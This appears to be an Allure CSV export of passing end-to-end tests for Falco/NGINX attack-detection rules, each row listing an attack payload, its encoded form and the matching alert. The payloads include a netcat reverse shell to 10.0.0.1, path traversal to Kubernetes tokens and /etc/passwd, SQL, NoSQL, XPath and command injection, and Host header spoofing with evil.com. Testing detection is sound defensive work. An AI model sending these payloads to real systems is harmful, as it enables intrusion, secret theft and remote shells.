"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HPP_MULTI_001` |
| **Name** | HPP multi-privilege escalation |
| **Category** | HPP |
| **Subcategory** | multi_value |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `&access=all&privilege=superadmin`
- **Encoded**: `%26access%3Dall%26privilege%3Dsuperadmin`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~13000ms
- **Timestamp**: 08:21:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HPP] HTTP Parameter Pollution attempt detected` |
| **Matched Rule** | `[NGINX HPP] HTTP Parameter Pollution attempt detected test_id=HPP_MULTI_001-1772266865287-o1kriz pattern_id=HPP_MULTI_001 uri=/?q=%26access%3Dall%26privilege%3Dsuperadmin client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HPP] HTTP Parameter Pollution attempt detected test_id=HPP_MULTI_001-1772266865287-o1kriz pattern_id=HPP_MULTI_001 uri=/?q=%26access%3Dall%26privilege%3Dsuperadmin client=127.0.0.1

**Falco Log Entry**:
```
08:21:05.000000000: Warning [NGINX HPP] HTTP Parameter Pollution attempt detected test_id=HPP_MULTI_001-1772266865287-o1kriz pattern_id=HPP_MULTI_001 uri=/?q=%26access%3Dall%26privilege%3Dsuperadmin client=127.0.0.1
```","2","test_e2e_with_logs[673_HPP_MULTI_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HHI_CACHE_002` |
| **Name** | X-Host cache poisoning |
| **Category** | HOST_HEADER |
| **Subcategory** | cache_poisoning |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `X-Host: evil.com`
- **Encoded**: `X-Host%3A%20evil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~19000ms
- **Timestamp**: 08:20:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Host Header] Host header injection attempt detected` |
| **Matched Rule** | `[NGINX Host Header] Host header injection attempt detected test_id=HHI_CACHE_002-1772266859787-arw8o6 pattern_id=HHI_CACHE_002 uri=/?q=X-Host%3A%20evil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Host Header] Host header injection attempt detected test_id=HHI_CACHE_002-1772266859787-arw8o6 pattern_id=HHI_CACHE_002 uri=/?q=X-Host%3A%20evil.com client=127.0.0.1

**Falco Log Entry**:
```
08:20:59.000000000: Warning [NGINX Host Header] Host header injection attempt detected test_id=HHI_CACHE_002-1772266859787-arw8o6 pattern_id=HHI_CACHE_002 uri=/?q=X-Host%3A%20evil.com client=127.0.0.1
```","2","test_e2e_with_logs[468_HHI_CACHE_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_SENS_002` |
| **Name** | Kubernetes secrets access |
| **Category** | PATH |
| **Subcategory** | sensitive_files |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../../../var/run/secrets/kubernetes.io/serviceaccount/token`
- **Encoded**: `..%2F..%2F..%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~75000ms
- **Timestamp**: 08:20:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_SENS_002-1772266803332-k0sok pattern_id=PATH_SENS_002 uri=/?q=..%2F..%2F..%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_SENS_002-1772266803332-k0sok pattern_id=PATH_SENS_002 uri=/?q=..%2F..%2F..%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken client=127.0.0.1

**Falco Log Entry**:
```
08:20:03.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_SENS_002-1772266803332-k0sok pattern_id=PATH_SENS_002 uri=/?q=..%2F..%2F..%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken client=127.0.0.1
```","2","test_e2e_with_logs[283_PATH_SENS_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_008` |
| **Name** | Root bash history access |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../../../../root/.bash_history`
- **Encoded**: `../../../../root/.bash_history`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~93000ms
- **Timestamp**: 08:19:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_008-1772266785291-qmzffk pattern_id=PATH_DOT_008 uri=/?q=../../../../root/.bash_history client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_008-1772266785291-qmzffk pattern_id=PATH_DOT_008 uri=/?q=../../../../root/.bash_history client=127.0.0.1

**Falco Log Entry**:
```
08:19:45.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_008-1772266785291-qmzffk pattern_id=PATH_DOT_008 uri=/?q=../../../../root/.bash_history client=127.0.0.1
```","2","test_e2e_with_logs[269_PATH_DOT_008]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `ENC_SQLI_DBL_002` |
| **Name** | Double-encoded OR 1=1 |
| **Category** | SQLI |
| **Subcategory** | double_encoded |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR 1=1--`
- **Encoded**: `%2527%20OR%201%3D1--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~42000ms
- **Timestamp**: 08:20:36.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=ENC_SQLI_DBL_002-1772266836922-2k1nyf pattern_id=ENC_SQLI_DBL_002 uri=/?q=%2527%20OR%201%3D1-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=ENC_SQLI_DBL_002-1772266836922-2k1nyf pattern_id=ENC_SQLI_DBL_002 uri=/?q=%2527%20OR%201%3D1-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:20:36.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=ENC_SQLI_DBL_002-1772266836922-2k1nyf pattern_id=ENC_SQLI_DBL_002 uri=/?q=%2527%20OR%201%3D1-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[744_ENC_SQLI_DBL_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_003` |
| **Name** | MongoDB greater-than bypass |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""$gt"": """"}`
- **Encoded**: `%7B%22%24gt%22%3A%20%22%22%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~88000ms
- **Timestamp**: 08:19:50.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_003-1772266790274-w5kg49 pattern_id=EMRG_MONGO_003 uri=/?q=%7B%22%24gt%22%3A%20%22%22%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_003-1772266790274-w5kg49 pattern_id=EMRG_MONGO_003 uri=/?q=%7B%22%24gt%22%3A%20%22%22%7D client=127.0.0.1

**Falco Log Entry**:
```
08:19:50.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_003-1772266790274-w5kg49 pattern_id=EMRG_MONGO_003 uri=/?q=%7B%22%24gt%22%3A%20%22%22%7D client=127.0.0.1
```","2","test_e2e_with_logs[660_EMRG_MONGO_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_066` |
| **Name** | Data URL XSS |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `data:text/html,<script>alert(1)</script>`
- **Encoded**: `data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 08:20:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_066-1772266806849-a2d5le pattern_id=XSS_ADV_066 uri=/?q=data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_066-1772266806849-a2d5le pattern_id=XSS_ADV_066 uri=/?q=data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:20:06.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_066-1772266806849-a2d5le pattern_id=XSS_ADV_066 uri=/?q=data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[144_XSS_ADV_066]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HHI_XH_002` |
| **Name** | X-Original-Host injection |
| **Category** | HOST_HEADER |
| **Subcategory** | host_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `X-Original-Host: evil.com`
- **Encoded**: `X-Original-Host%3A%20evil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~23000ms
- **Timestamp**: 08:20:55.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Host Header] Host header injection attempt detected` |
| **Matched Rule** | `[NGINX Host Header] Host header injection attempt detected test_id=HHI_XH_002-1772266855776-a7n2w pattern_id=HHI_XH_002 uri=/?q=X-Original-Host%3A%20evil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Host Header] Host header injection attempt detected test_id=HHI_XH_002-1772266855776-a7n2w pattern_id=HHI_XH_002 uri=/?q=X-Original-Host%3A%20evil.com client=127.0.0.1

**Falco Log Entry**:
```
08:20:55.000000000: Warning [NGINX Host Header] Host header injection attempt detected test_id=HHI_XH_002-1772266855776-a7n2w pattern_id=HHI_XH_002 uri=/?q=X-Original-Host%3A%20evil.com client=127.0.0.1
```","2","test_e2e_with_logs[773_HHI_XH_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_016` |
| **Name** | MySQL BENCHMARK with large iterations |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `BENCHMARK(10000000,MD5('a'))`
- **Encoded**: `BENCHMARK(10000000%2CMD5('a'))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~100000ms
- **Timestamp**: 08:19:38.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1772266778796-u78yn6 pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1772266778796-u78yn6 pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:19:38.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1772266778796-u78yn6 pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[121_SQLI_TIME_016]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_FUNC_006` |
| **Name** | XPath translate function injection |
| **Category** | XPATH |
| **Subcategory** | function_abuse |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `translate(//user[1]/name,'abc','ABC')`
- **Encoded**: `translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 08:20:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_006-1772266817289-idxb3r pattern_id=XPATH_FUNC_006 uri=/?q=translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_006-1772266817289-idxb3r pattern_id=XPATH_FUNC_006 uri=/?q=translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29 client=127.0.0.1

**Falco Log Entry**:
```
08:20:17.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_006-1772266817289-idxb3r pattern_id=XPATH_FUNC_006 uri=/?q=translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29 client=127.0.0.1
```","2","test_e2e_with_logs[588_XPATH_FUNC_006]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_FUNC_005` |
| **Name** | XPath concat function injection |
| **Category** | XPATH |
| **Subcategory** | function_abuse |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `concat(//user[1]/name,'_',//user[1]/role)`
- **Encoded**: `concat%28%2F%2Fuser%5B1%5D%2Fname%2C%27_%27%2C%2F%2Fuser%5B1%5D%2Frole%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 08:20:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_005-1772266816788-guymse pattern_id=XPATH_FUNC_005 uri=/?q=concat%28%2F%2Fuser%5B1%5D%2Fname%2C%27_%27%2C%2F%2Fuser%5B1%5D%2Frole%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_005-1772266816788-guymse pattern_id=XPATH_FUNC_005 uri=/?q=concat%28%2F%2Fuser%5B1%5D%2Fname%2C%27_%27%2C%2F%2Fuser%5B1%5D%2Frole%29 client=127.0.0.1

**Falco Log Entry**:
```
08:20:16.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_005-1772266816788-guymse pattern_id=XPATH_FUNC_005 uri=/?q=concat%28%2F%2Fuser%5B1%5D%2Fname%2C%27_%27%2C%2F%2Fuser%5B1%5D%2Frole%29 client=127.0.0.1
```","2","test_e2e_with_logs[587_XPATH_FUNC_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_002` |
| **Name** | Netcat reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `nc -e /bin/sh 10.0.0.1 4444`
- **Encoded**: `nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~74000ms
- **Timestamp**: 08:20:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1772266804818-3t1igp pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1772266804818-3t1igp pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1

**Falco Log Entry**:
```
08:20:04.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1772266804818-3t1igp pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1
```","1","test_e2e_with_logs[388_CMD_REVSH_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_061` |
| **Name** | DOM outerHTML Mutation |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `element.outerHTML=payload`
- **Encoded**: `element.outerHTML%3Dpayload`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~74000ms
- **Timestamp**: 08:20:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_061-1772266804344-l79vy pattern_id=XSS_ADV_061 uri=/?q=element.outerHTML%3Dpayload client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_061-1772266804344-l79vy pattern_id=XSS_ADV_061 uri=/?q=element.outerHTML%3Dpayload client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:20:04.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_061-1772266804344-l79vy pattern_id=XSS_ADV_061 uri=/?q=element.outerHTML%3Dpayload client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[139_XSS_ADV_061]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_017` |
| **Name** | Backtick command substitution |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: ``id``
- **Encoded**: `%60id%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~86000ms
- **Timestamp**: 08:19:52.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_BASIC_017-1772266792292-a6vkb pattern_id=CMD_BASIC_017 uri=/?q=%60id%60 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BASIC_017-1772266792292-a6vkb pattern_id=CMD_BASIC_017 uri=/?q=%60id%60 client=127.0.0.1

**Falco Log Entry**:
```
08:19:52.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BASIC_017-1772266792292-a6vkb pattern_id=CMD_BASIC_017 uri=/?q=%60id%60 client=127.0.0.1
```","2","test_e2e_with_logs[344_CMD_BASIC_017]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_POLY_003` |
| **Name** | Multi-database time delay polyglot |
| **Category** | SQLI |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `1';WAITFOR DELAY '0:0:30'--`
- **Encoded**: `1%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 08:20:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_POLY_003-1772266816875-q68z4i pattern_id=SQLI_POLY_003 uri=/?q=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_POLY_003-1772266816875-q68z4i pattern_id=SQLI_POLY_003 uri=/?q=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:20:16.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_POLY_003-1772266816875-q68z4i pattern_id=SQLI_POLY_003 uri=/?q=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[094_SQLI_POLY_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_060` |
| **Name** | DOM innerHTML Mutation |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `element.innerHTML=payload`
- **Encoded**: `element.innerHTML%3Dpayload`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~75000ms
- **Timestamp**: 08:20:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_060-1772266803843-grxnr pattern_id=XSS_ADV_060 uri=/?q=element.innerHTML%3Dpayload client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_060-1772266803843-grxnr pattern_id=XSS_ADV_060 uri=/?q=element.innerHTML%3Dpayload client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:20:03.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_060-1772266803843-grxnr pattern_id=XSS_ADV_060 uri=/?q=element.innerHTML%3Dpayload client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[138_XSS_ADV_060]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DBL_003` |
| **Name** | Double encoded dot |
| **Category** | PATH |
| **Subcategory** | double_encoding |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%252e%252e/%252e%252e/%252e%252e/etc/passwd`
- **Encoded**: `%25252e%25252e%2F%25252e%25252e%2F%25252e%25252e%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~76000ms
- **Timestamp**: 08:20:02.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_DBL_003-1772266802330-7tfjde pattern_id=PATH_DBL_003 uri=/?q=%25252e%25252e%2F%25252e%25252e%2F%25252e%25252e%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_DBL_003-1772266802330-7tfjde pattern_id=PATH_DBL_003 uri=/?q=%25252e%25252e%2F%25252e%25252e%2F%25252e%25252e%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
08:20:02.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_DBL_003-1772266802330-7tfjde pattern_id=PATH_DBL_003 uri=/?q=%25252e%25252e%2F%25252e%25252e%2F%25252e%25252e%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[259_PATH_DBL_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
